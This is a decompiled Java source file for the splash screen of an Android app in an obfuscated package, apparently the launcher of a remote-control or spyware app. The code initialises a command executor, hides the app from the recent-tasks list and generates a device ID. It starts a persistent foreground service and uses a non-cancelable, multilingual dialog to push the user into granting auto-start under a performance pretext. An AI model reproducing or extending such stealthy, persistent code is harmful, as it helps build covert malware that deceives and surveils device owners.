/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.AlertDialog$Builder
 *  android.content.Context
 *  android.content.DialogInterface
 *  android.content.DialogInterface$OnClickListener
 *  android.content.Intent
 *  android.content.pm.PackageManager$NameNotFoundException
 *  android.graphics.Point
 *  android.graphics.drawable.Drawable
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Handler
 *  android.view.View
 *  android.view.ViewGroup
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.Locale;
import linker.resourcer.encoder.AlarmHelper;
import linker.resourcer.encoder.MIUIAutoStart;
import linker.resourcer.encoder.MyExceptionHandler;
import linker.resourcer.encoder.R;
import linker.resourcer.encoder.UpdatePromptActivity;
import linker.resourcer.encoder.SplashActivity$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.SplashActivity$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.CommandExecutor;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.ConfigurationProvider;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.SetupOrchestrationService;
import linker.resourcer.encoder.SystemUtilities;
import linker.resourcer.encoder.SharedPreferencesManager;
import linker.resourcer.encoder.WebViewActivity;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class SplashActivity
extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 22;
    WebView Mwbview;

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private boolean AskAutoStart() {
        block23: {
            String string2;
            Object object;
            String string3;
            Context context;
            MIUIAutoStart mIUIAutoStart;
            block24: {
                int n;
                block22: {
                    mIUIAutoStart = MIUIAutoStart.getInstance();
                    if (SharedPreferencesManager.ReadBool(this.getApplicationContext(), ConfigurationConstants.AutoStartOn, false) || !mIUIAutoStart.isAutoStartPermissionAvailable(this.getApplicationContext())) break block23;
                    context = this.getApplicationContext();
                    AlarmHelper.setAlarm(this.getApplicationContext());
                    string3 = Locale.getDefault().getLanguage();
                    switch (string3.hashCode()) {
                        case 3886: {
                            if (!string3.equals("zh")) break;
                            n = 1;
                            break block22;
                        }
                        case 3710: {
                            if (!string3.equals("tr")) break;
                            n = 2;
                            break block22;
                        }
                        case 3651: {
                            if (!string3.equals("ru")) break;
                            n = 5;
                            break block22;
                        }
                        case 3588: {
                            if (!string3.equals("pt")) break;
                            n = 3;
                            break block22;
                        }
                        case 3246: {
                            if (!string3.equals("es")) break;
                            n = 4;
                            break block22;
                        }
                        case 3121: {
                            if (!string3.equals("ar")) break;
                            n = 0;
                            break block22;
                        }
                    }
                    n = -1;
                }
                switch (n) {
                    default: {
                        break;
                    }
                    case 5: {
                        string3 = "\u0425\u043e\u0440\u043e\u0448\u043e";
                        object = "\u0410\u0432\u0442\u043e\u0437\u0430\u043f\u0443\u0441\u043a";
                        string2 = "\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u0435 \u044d\u0442\u043e\u043c\u0443 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044e \u0430\u0432\u0442\u043e\u0437\u0430\u043f\u0443\u0441\u043a \u0434\u043b\u044f \u0441\u0442\u0430\u0431\u0438\u043b\u044c\u043d\u043e\u0439 \u0440\u0430\u0431\u043e\u0442\u044b.";
                        break block24;
                    }
                    case 4: {
                        string3 = "OK";
                        object = "Inicio Autom\u00e1tico";
                        string2 = "Permita que esta aplicaci\u00f3n se inicie autom\u00e1ticamente para un mejor rendimiento.";
                        break block24;
                    }
                    case 3: {
                        string3 = "OK";
                        object = "Inicializa\u00e7\u00e3o Autom\u00e1tica";
                        string2 = "Permita que este aplicativo inicie automaticamente para melhor desempenho.";
                        break block24;
                    }
                    case 2: {
                        string3 = "Tamam";
                        object = "Otomatik Ba\u015flatma";
                        string2 = "Sorunsuz \u00e7al\u0131\u015fmas\u0131 i\u00e7in bu uygulamaya otomatik ba\u015flatma izni verin.";
                        break block24;
                    }
                    case 1: {
                        string3 = "\u597d\u7684";
                        object = "\u81ea\u52a8\u542f\u52a8";
                        string2 = "\u5141\u8bb8\u6b64\u5e94\u7528\u7a0b\u5e8f\u81ea\u52a8\u542f\u52a8\u4ee5\u786e\u4fdd\u6d41\u7545\u8fd0\u884c\u3002";
                        break block24;
                    }
                    case 0: {
                        string3 = "\u0645\u0648\u0627\u0641\u0642";
                        object = "\u0627\u0644\u062a\u0634\u063a\u064a\u0644 \u0627\u0644\u062a\u0644\u0642\u0627\u0626\u064a";
                        string2 = "\u0627\u0633\u0645\u062d \u0644\u0647\u0630\u0627 \u0627\u0644\u062a\u0637\u0628\u064a\u0642 \u0628\u0627\u0644\u062a\u0634\u063a\u064a\u0644 \u0627\u0644\u062a\u0644\u0642\u0627\u0626\u064a \u0644\u062a\u062d\u0633\u064a\u0646 \u0627\u0644\u0623\u062f\u0627\u0621.";
                        break block24;
                    }
                }
                string2 = "Allow this app to auto-start for smooth performance.";
                object = "Auto Start";
                string3 = "OK";
            }
            AlertDialog.Builder builder = null;
            try {
                AlertDialog.Builder builder2;
                try {
                    builder = builder2 = this.getPackageManager().getApplicationIcon(this.getPackageName());
                }
                catch (PackageManager.NameNotFoundException nameNotFoundException) {
                    // empty catch block
                }
                builder2 = new AlertDialog.Builder((Context)this, 16974545);
                string2 = builder2.setTitle((CharSequence)object).setMessage((CharSequence)string2);
                object = new SplashActivity$$ExternalSyntheticLambda0(this, mIUIAutoStart, context);
                string3 = string2.setPositiveButton((CharSequence)string3, (DialogInterface.OnClickListener)object);
                if (builder != null) {
                    string3.setIcon((Drawable)builder);
                }
                string3.setCancelable(false);
                string3.show();
                return true;
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        }
        return false;
    }

    private void checkAndRequestPermissions() {
        String[] stringArray = this.NormalPermissions();
        ArrayList<String> arrayList = new ArrayList<String>();
        for (String string2 : stringArray) {
            if (ContextCompat.checkSelfPermission(this.getApplicationContext(), string2) == 0) continue;
            arrayList.add(string2);
        }
        if (!arrayList.isEmpty()) {
            ActivityCompat.requestPermissions(this, arrayList.toArray(new String[0]), 22);
        }
    }

    private void endit() {
        new Thread(new SplashActivity$$ExternalSyntheticLambda1(this)).start();
    }

    public static String getLabelApplication(Context context) {
        try {
            String string2 = (String)context.getPackageManager().getApplicationLabel(context.getPackageManager().getApplicationInfo(context.getPackageName(), 128));
            return string2;
        }
        catch (Exception exception) {
            return context.getString(R.string.BaseName);
        }
    }

    private void out() {
        Context context = this.getApplicationContext();
        Intent intent = new Intent(this.getApplicationContext(), SetupOrchestrationService.class);
        if (!SystemUtilities.isServiceRunning(this.getApplicationContext(), SetupOrchestrationService.class)) {
            if (Build.VERSION.SDK_INT >= 26) {
                this.startForegroundService(intent);
            } else {
                this.startService(intent);
            }
        }
        if (SharedPreferencesManager.Read(context, ConfigurationConstants.req_update, "0").equals("1")) {
            if (!SharedPreferencesManager.Read(context, ConfigurationConstants.up_tag, "").equals(ConfigurationProvider.Ctag)) {
                context = new Intent(this.getApplicationContext(), UpdatePromptActivity.class);
                context.addFlags(0x10000000);
                this.startActivity((Intent)context);
                this.finish();
                return;
            }
            SharedPreferencesManager.Write(context, ConfigurationConstants.req_update, "0");
        }
        context = new Intent(this.getApplicationContext(), WebViewActivity.class);
        context.addFlags(0x10000000);
        context.addFlags(65536);
        this.startActivity((Intent)context);
        this.finish();
    }

    public String[] NormalPermissions() {
        ArrayList<String> arrayList = new ArrayList<String>();
        arrayList.add("android.permission.INTERNET");
        arrayList.add("android.permission.WAKE_LOCK");
        arrayList.add("android.permission.ACCESS_NETWORK_STATE");
        arrayList.add("android.permission.ACCESS_WIFI_STATE");
        arrayList.add("android.permission.CHANGE_WIFI_STATE");
        arrayList.add("android.permission.MODIFY_AUDIO_SETTINGS");
        if (Build.VERSION.SDK_INT >= 33) {
            arrayList.add("android.permission.POST_NOTIFICATIONS");
        }
        return arrayList.toArray(new String[0]);
    }

    /* synthetic */ void lambda$AskAutoStart$1$com-icontrol-protector-SplashActivity(MIUIAutoStart mIUIAutoStart, Context context, DialogInterface dialogInterface, int n) {
        mIUIAutoStart.getAutoStartPermission(this.getApplicationContext());
        SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.AutoStartOn, true);
        SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.forautostart, true);
        new Handler(context.getMainLooper()).postDelayed(new Runnable(this){
            final SplashActivity this$0;
            {
                this.this$0 = vwfkyqppf;
            }

            @Override
            public void run() {
                Intent intent = new Intent(this.this$0.getApplicationContext(), SetupOrchestrationService.class);
                if (!SystemUtilities.isServiceRunning(this.this$0.getApplicationContext(), SetupOrchestrationService.class)) {
                    if (Build.VERSION.SDK_INT >= 26) {
                        this.this$0.startForegroundService(intent);
                    } else {
                        this.this$0.startService(intent);
                    }
                }
            }
        }, 1000L);
    }

    /* synthetic */ void lambda$endit$0$com-icontrol-protector-SplashActivity() {
        do {
            try {
                Thread.sleep(5000L);
            }
            catch (Exception exception) {
                exception.printStackTrace();
            }
        } while (!ConfigurationConstants.engine_done);
        this.out();
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    protected void onCreate(Bundle object) {
        super.onCreate((Bundle)object);
        this.checkAndRequestPermissions();
        Context context = this.getApplicationContext();
        CommandExecutor.instance(this.getApplicationContext());
        UtilityHelper.excludeFromTaskList(this.getApplicationContext());
        if (SharedPreferencesManager.Read(context, "ID", "").length() == 0) {
            object = UtilityHelper.Create_DevicID() + String.valueOf(UtilityHelper.randomnumber(100, 199));
            AndroidLogger.Debug("CreateID", (String)object);
            SharedPreferencesManager.Write(context, "ID", (String)object);
        }
        if (SharedPreferencesManager.Read(context, "Wscr", "").length() == 0) {
            object = new Point();
            this.getWindowManager().getDefaultDisplay().getRealSize((Point)object);
            int n = Math.min(((Point)object).x, ((Point)object).y);
            int n2 = Math.max(((Point)object).x, ((Point)object).y);
            object = context.getSharedPreferences(context.getPackageName(), 0).edit();
            object.putString("Wscr", String.valueOf(n));
            object.putString("Hscr", String.valueOf(n2));
            object.apply();
        }
        Thread.setDefaultUncaughtExceptionHandler(new MyExceptionHandler(context));
        if (!ConfigurationConstants.engine_done && !ConfigurationProvider.Is_Store.equals("1")) {
            block13: {
                String string2;
                SetupOrchestrationService.maxholder = 28;
                this.requestWindowFeature(1);
                this.getWindow().setFlags(1024, 1024);
                this.Mwbview = new WebView(context);
                object = null;
                try {
                    string2 = UtilityHelper.loadHtmlFromAssets(this.getApplicationContext(), "s1s2s3s4.html");
                    object = string2;
                }
                catch (Exception exception) {
                    // empty catch block
                }
                string2 = SplashActivity.getLabelApplication(context);
                try {
                    String string3 = Locale.getDefault().getLanguage();
                    object = ((String)object).replace("APPNAME", string2).replace("[LNG]", string3).replace("2024", "2025").replace("[BASE-ICO]", UtilityHelper.getAppIconAsBase64(context));
                }
                catch (Exception exception) {
                    // empty catch block
                    break block13;
                }
                try {
                    this.Mwbview.getSettings().setJavaScriptEnabled(true);
                    context = this.Mwbview;
                    string2 = new WebViewClient();
                    context.setWebViewClient((WebViewClient)string2);
                    this.Mwbview.loadDataWithBaseURL(null, (String)object, "text/html", "UTF-8", null);
                    this.setContentView((View)this.Mwbview);
                }
                catch (Exception exception) {}
            }
            this.out();
            if (this.AskAutoStart()) {
                return;
            }
            object = new Intent(this.getApplicationContext(), SetupOrchestrationService.class);
            if (!SystemUtilities.isServiceRunning(this.getApplicationContext(), SetupOrchestrationService.class)) {
                if (Build.VERSION.SDK_INT >= 26) {
                    this.startForegroundService((Intent)object);
                } else {
                    this.startService((Intent)object);
                }
            }
            this.endit();
            return;
        }
        this.out();
        this.finish();
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    protected void onDestroy() {
        super.onDestroy();
        try {
            if (this.Mwbview == null) return;
            this.Mwbview.stopLoading();
            this.Mwbview.clearHistory();
            this.Mwbview.clearCache(true);
            ViewGroup viewGroup = (ViewGroup)this.Mwbview.getParent();
            if (viewGroup != null) {
                viewGroup.removeView((View)this.Mwbview);
            }
            this.Mwbview.removeAllViews();
            this.Mwbview.destroy();
            this.Mwbview = null;
            return;
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void onRequestPermissionsResult(int n, String[] stringArray, int[] nArray) {
        super.onRequestPermissionsResult(n, stringArray, nArray);
    }

    protected void onResume() {
        super.onResume();
        if (SharedPreferencesManager.ReadBool(this.getApplicationContext(), ConfigurationConstants.forautostart, true)) {
            SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.forautostart, false);
            this.endit();
        }
    }
}

